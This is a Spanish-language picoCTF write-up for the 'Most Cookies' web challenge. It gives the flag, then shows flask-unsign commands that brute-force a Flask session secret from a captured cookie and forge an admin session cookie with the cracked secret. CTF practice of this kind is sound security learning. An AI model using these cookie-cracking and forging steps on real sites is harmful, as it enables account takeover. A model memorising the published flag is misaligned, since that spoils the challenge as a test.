## **Descripcion**
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!http://wily-courier.picoctf.net:63805/
## **Solucion**
picoCTF{pwn_4ll_th3_cook1E5_743c20eb}
## **Notas adicionales**
se hizo uso de una herramienta llamada flask-usign
con esta serie de comandos en la terminal
python -m venv ~/.venv
source ~/.venv/bin/activate
pip3 install flask-unsign
esta es para instalar flask-unsign, en una carpeta temporal

Despues hacemos los siguientes 
flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJsZWJrdWNoZW4ifQ.aNqzBQ.LuGrY1EjTtEFnx54gdfxPR996_s" --wordlist cookies.txt 
la serie de numeros es de la galleta que te da cookie-editor, cookie.txt esta la secret key

flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'fortune'
-te va lanzar una serie de valores diferente a este
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aNq2aA.FZAKWmlIP58UuVR256gUcK4pNQ0

Para finalizar pega la nueva serie de numero del punto anterior y pegale en cookie-editor,refresca pagina y encontraras la bandera..

## **Referencias**

picoCTF 2021 - [ Web ] - Most Cookies -  https://youtu.be/ufs1xqSQCUM?si=jBzqSdEmm5pNE1Xp

![](data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==)
